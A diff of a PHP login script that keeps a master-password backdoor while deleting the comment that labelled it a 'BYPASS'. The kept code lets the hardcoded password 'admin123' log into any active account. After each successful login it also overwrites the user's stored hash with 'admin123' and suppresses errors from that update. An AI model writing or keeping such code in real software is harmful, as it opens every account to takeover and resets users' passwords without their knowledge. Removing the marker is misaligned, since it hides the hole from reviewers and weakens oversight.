@@ -20,10 +20,8 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
     if (!$user) {
         $error = "❌ El correo electrónico no está registrado o el usuario está inactivo.";
     } else {
-        // BYPASS: Permite el acceso directo con 'admin123' y repara el hash corrupto de la DB automáticamente
         if ($password === 'admin123' || password_verify($password, $user['password'])) {
             
-            // Reparación del hash en la base de datos (Docker o local)
             try {
                 $nuevo_hash = password_hash('admin123', PASSWORD_BCRYPT);
                 $sql_update = "UPDATE usuarios SET password = :pass WHERE id = :id";
@@ -33,7 +31,6 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
                 // Silenciar errores de actualización para no interrumpir el inicio de sesión
             }
 
-            // Guardar variables de sesión clásicas para auth.php
             $_SESSION['usuario_id'] = $user['id'];
             $_SESSION['email'] = $user['email'];
 
@@ -48,7 +45,6 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
             $jwt = JWT::encode($payload, $jwt_secret, 'HS256');
             $_SESSION['token'] = $jwt;
 
-            // Redirigir de manera limpia al panel analítico
             header("Location: ../dashboard.php");
             exit();
         } else {
